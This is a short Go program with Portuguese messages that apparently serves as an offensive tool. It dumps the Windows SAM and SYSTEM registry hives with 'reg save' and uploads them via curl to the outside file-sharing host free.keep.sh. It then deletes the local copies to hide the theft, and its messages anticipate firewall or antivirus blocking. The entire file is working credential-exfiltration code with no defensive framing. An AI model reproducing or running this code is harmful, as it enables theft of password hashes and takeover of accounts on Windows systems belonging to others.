package main
import (
"log"
"fmt"
"os/exec"
)

func main(){
    sysSam()
    exFil()
}

func sysSam(){ //Main Function

fmt.Println("Dumping Sys and SAM")



sam := exec.Command("reg", "save", "hklm\\sam", "C:\\TEMP\\54m")
system := exec.Command("reg", "save", "hklm\\system", "C:\\TEMP\\5y5")

//SAM
samDump, err := sam.Output()
if err != nil {
fmt.Println("Acontenceu algo errado.")
log.Fatal(err)
}
fmt.Println("Sam, Dumpando com sucesso!!!")
fmt.Println(string(samDump))

//System
systemDump, err := system.Output()
if err != nil {
fmt.Println("Acontenceu algo errado.")
log.Fatal(err)
}
fmt.Println("System, Dumpando com sucesso!!!")
fmt.Println(string(systemDump))

} //End Function

func exFil(){
fmt.Println("\nExfiltrando SAM E Sys\n")
exfSAM := exec.Command("curl", "-k", "-T", "C:\\TEMP\\54m",  "https://free.keep.sh")
exfSYSTEMCompact := exec.Command("powershell", "/C", "Compress-Archive", "-Path", "C:\\TEMP\\5y5", "-DestinationPath", "C:\\TEMP\\5y5.zip")
exfSYSTEM := exec.Command("curl", "-k", "-T", "C:\\TEMP\\5y5.zip", "https://free.keep.sh")
deleteFiles := exec.Command("cmd", "/C", "del", "/F", "C:\\TEMP\\5*")

//SAM EXFIL
exfilSAM, err := exfSAM.Output()
if err != nil {
fmt.Println("\nProvavelmente bloqueado pelo firewall/AV.")
log.Fatal(err)
}
fmt.Println("\nSAM Exfiltrado com sucesso:", string(exfilSAM))

//COMPACT SYSTEM
CompactSystem, err := exfSYSTEMCompact.Output()
if err != nil {
fmt.Println("\nAconteceu um erro ao tentar compactar o khlm/system")
log.Fatal(err)
}
fmt.Println("\nSystem Compactado com sucesso, exfiltrando...", string(CompactSystem))

//SYSTEM EXFIL
exfilSYSTEM, err := exfSYSTEM.Output()
if err != nil {
fmt.Println("\nProvavelmente bloqueado pelo firewall/AV.")
log.Fatal(err)
}
fmt.Println("\nSYSTEM Exfiltrado com sucesso", string(exfilSYSTEM))

//DeleteFiles
delFiles, err := deleteFiles.Output()
if err != nil {
fmt.Println("\nAcontenceu um erro ao tentar apagar os arquivos.")
log.Fatal(err)
}
fmt.Println("\nArquivos deletados.", string(delFiles))


}